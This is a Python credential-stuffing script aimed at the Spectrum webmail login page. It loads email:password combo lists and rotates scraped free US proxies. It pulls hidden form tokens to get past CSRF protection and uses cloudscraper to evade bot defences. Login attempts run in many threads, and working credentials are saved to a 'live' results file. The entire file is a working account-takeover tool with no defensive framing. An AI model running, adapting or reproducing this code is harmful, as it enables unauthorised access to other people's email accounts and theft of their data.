import cloudscraper
import random
import time
import os
import threading
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from colorama import Fore, init

# Inisialisasi warna terminal
init(autoreset=True)

class ValosintChecker:
    def __init__(self):
        self.valid_count = 0
        self.bad_count = 0
        self.error_count = 0
        self.lock = threading.Lock()

    def _get_time(self):
        return datetime.now().strftime("%H:%M:%S")

    def _display_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Logo besar warna Cyan
        print(f"{Fore.CYAN}██    ██  █████  ██       ██████  ███████ ██ ███    ██ ████████ ")
        print(f"{Fore.CYAN}██    ██ ██   ██ ██      ██    ██ ██      ██ ████   ██    ██    ")
        print(f"{Fore.CYAN}██    ██ ███████ ██      ██    ██ ███████ ██ ██ ██  ██    ██    ")
        print(f"{Fore.CYAN} ██  ██  ██   ██ ██      ██    ██      ██ ██ ██  ██ ██    ██    ")
        print(f"{Fore.CYAN}  ████   ██   ██ ███████  ██████  ███████ ██ ██   ████    ██    ")
        print("")
        print(f"               {Fore.WHITE}spectrum_account_checker • VALOSINT SCRIPT")
        print(f"              {Fore.CYAN}◇ COMBO ◇ PROXIES ◇ CHECKER ◇ CRYPTO ◇")
        print("")
        print(f"                         {Fore.BLUE}╭──────────────╮")
        print(f"                         {Fore.CYAN}│ {Fore.WHITE}PROJECT_VALO {Fore.CYAN}│")
        print(f"                         {Fore.BLUE}╰──────────────╯")
        
        # Bagian Informasi Bot
        print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
        print(f"{Fore.GREEN}Target      {Fore.WHITE}: webmail.spectrum.net")
        print(f"{Fore.GREEN}Admin       {Fore.WHITE}: valosint_admin")
        print(f"{Fore.GREEN}Script Name {Fore.WHITE}: spectrum_checker_v5")
        print(f"{Fore.GREEN}Runtime     {Fore.WHITE}: Python + Termux")
        print(f"{Fore.GREEN}Started At  {Fore.WHITE}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")

    def _get_us_proxies(self):
        try:
            url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=US&ssl=all&anonymity=all"
            res = requests.get(url, timeout=10)
            proxies = [line.strip() for line in res.text.splitlines() if line.strip()]
            return proxies
        except Exception:
            return []

    def check_account(self, credential, proxies):
        if ":" not in credential: return
        email, password = credential.split(":")
        
        # Menggunakan proxy jika tersedia
        px = random.choice(proxies) if proxies else None
        px_map = {"http": f"http://{px}", "https": f"http://{px}"} if px else None
        
        try:
            target_url = "https://webmail.spectrum.net/index.php/mail/auth"
            
            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'Referer': target_url
            }

            # 1. Bypass CSRF
            res_get = scraper.get(target_url, headers=headers, proxies=px_map, timeout=15)
            soup = BeautifulSoup(res_get.text, 'html.parser')
            
            payload = {}
            for hidden in soup.find_all('input', type='hidden'):
                if hidden.get('name'):
                    payload[hidden.get('name')] = hidden.get('value', '')

            payload['email'] = email
            payload['password'] = password

            # 2. Kirim Login
            res = scraper.post(target_url, data=payload, headers=headers, proxies=px_map, timeout=15, allow_redirects=True)

            ts = self._get_time()
            content = res.text.lower()
            
            # 3. Validasi
            if "doesn't match our records" in content or "invalid" in content or "incorrect" in content or "auth_failed" in content:
                print(f"{Fore.RED}[{ts}] [DD]   {email} | Wrong Password/Not Match")
                with self.lock: self.bad_count += 1
            
            elif "/auth" not in res.url and ("inbox" in res.url or "mail" in res.url or "signout" in content or "logout" in content):
                print(f"{Fore.GREEN}[{ts}] [LIVE] {email} | {password}")
                if not os.path.exists("results"): os.makedirs("results")
                with open("results/live.txt", "a") as f: f.write(f"{email}:{password}\n")
                with self.lock: self.valid_count += 1
            
            elif "locked" in content or "suspended" in content:
                print(f"{Fore.RED}[{ts}] [DD]   {email} | Account Locked")
                with self.lock: self.bad_count += 1
            
            else:
                print(f"{Fore.MAGENTA}[{ts}] [RETRY] {email} | Blocked/Captcha (Proxy: {px})")
                with self.lock: self.error_count += 1

        except Exception as e:
            # Jika proxy mati atau timeout
            print(f"{Fore.YELLOW}[{self._get_time()}] [ERROR] {email} | Proxy Failed/Timeout")
            with self.lock: self.error_count += 1

    def start(self):
        self._display_banner()

        # Input Interaktif
        combo_file = input(f"{Fore.WHITE}[?] Input Combo File [{Fore.CYAN}Enter for 'combo.txt'{Fore.WHITE}]: ").strip() or "combo.txt"
        proxy_file = input(f"{Fore.WHITE}[?] Input Proxy File [{Fore.CYAN}Enter for Auto USA{Fore.WHITE}]   : ").strip()
        thread_input = input(f"{Fore.WHITE}[?] Threads Amount   [{Fore.CYAN}Enter for 5{Fore.WHITE}]            : ").strip() or "5"
        threads = int(thread_input)
        
        print(f"\n{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
        
        # Cek File Combo
        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Initializing checker system...")
        time.sleep(0.5)
        
        if not os.path.exists(combo_file):
            print(f"{Fore.RED}[!] {Fore.WHITE}System halt: Combo file '{combo_file}' not found.")
            return
            
        accounts = [l.strip() for l in open(combo_file, 'r', encoding='utf-8') if ":" in l]
        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Loading {len(accounts)} accounts from database...")
        time.sleep(0.5)

        # Penanganan Proxy
        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Configuring network environment...")
        proxies = []
        if proxy_file and os.path.exists(proxy_file):
            proxies = [l.strip() for l in open(proxy_file, 'r', encoding='utf-8')]
            print(f"{Fore.YELLOW}[*] {Fore.WHITE}Loaded {len(proxies)} custom proxies.")
        else:
            proxies = self._get_us_proxies()
            if proxies:
                print(f"{Fore.YELLOW}[*] {Fore.WHITE}Scraped {len(proxies)} free USA proxies.")
            else:
                print(f"{Fore.RED}[!] {Fore.WHITE}Failed to get free proxies. Running without proxy.")

        time.sleep(0.5)
        print(f"{Fore.GREEN}[√] {Fore.WHITE}Terminal interface ready.")
        print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────\n")
        
        print(f"{Fore.GREEN}[√] CHECKER ONLINE")
        print(f"{Fore.WHITE}Press {Fore.MAGENTA}CTRL + C{Fore.WHITE} to stop the process.\n")

        if not accounts:
            print(f"{Fore.RED}[!] Database empty. Exiting.")
            return

        # Eksekusi Checker
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for acc in accounts:
                executor.submit(self.check_account, acc, proxies)

        # Rangkuman Akhir
        print(f"\n{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
        print(f"{Fore.GREEN} [+] TOTAL LIVE : {self.valid_count}")
        print(f"{Fore.RED} [-] TOTAL DD   : {self.bad_count}")
        print(f"{Fore.MAGENTA} [!] RETRY/ERR  : {self.error_count}")
        print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
        print(f"{Fore.WHITE} Process finished. LIVE accounts saved in 'results/live.txt'")

if __name__ == "__main__":
    ValosintChecker().start()
